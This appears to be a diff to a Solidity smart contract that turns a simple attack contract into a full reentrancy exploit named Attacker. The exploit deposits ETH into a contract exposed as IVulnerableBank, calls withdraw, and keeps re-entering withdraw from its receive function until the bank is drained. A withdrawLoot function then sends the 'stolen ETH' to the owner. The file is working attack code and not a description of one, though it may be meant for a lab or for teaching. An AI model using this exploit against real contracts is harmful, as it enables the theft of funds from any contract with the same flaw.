@@ -1,30 +1,41 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
+pragma solidity ^0.8.20;
 
-interface IEtherBank {
+interface IVulnerableBank {
     function deposit() external payable;
-    function withdraw(uint256 amount) external;
+    function withdraw() external;
 }
 
-contract Attack {
-    IEtherBank public bank;
-
-    uint256 public constant ATTACK_AMOUNT = 0.01 ether;
+contract Attacker {
+    IVulnerableBank public bank;
+    address public owner;
 
     constructor(address _bank) {
-        bank = IEtherBank(_bank);
+        bank = IVulnerableBank(_bank);
+        owner = msg.sender;
     }
 
+    // 🔥 Deposit + immediately start attack
+    function attack() external payable {
+        require(msg.value > 0, "Send ETH");
+
+        // Deposit ETH into bank
+        bank.deposit{value: msg.value}();
+
+        // Trigger reentrancy
+        bank.withdraw();
+    }
+
+    // Re-enter withdraw()
     receive() external payable {
-        if (address(bank).balance >= ATTACK_AMOUNT) {
-            bank.withdraw(ATTACK_AMOUNT);
+        if (address(bank).balance > 0) {
+            bank.withdraw();
         }
     }
 
-    function attack() external payable {
-        require(msg.value == ATTACK_AMOUNT, "Send exactly 0.01 ETH");
-
-        bank.deposit{value: ATTACK_AMOUNT}();
-        bank.withdraw(ATTACK_AMOUNT);
+    // Withdraw stolen ETH
+    function withdrawLoot() external {
+        require(msg.sender == owner, "Not owner");
+        payable(owner).transfer(address(this).balance);
     }
 }
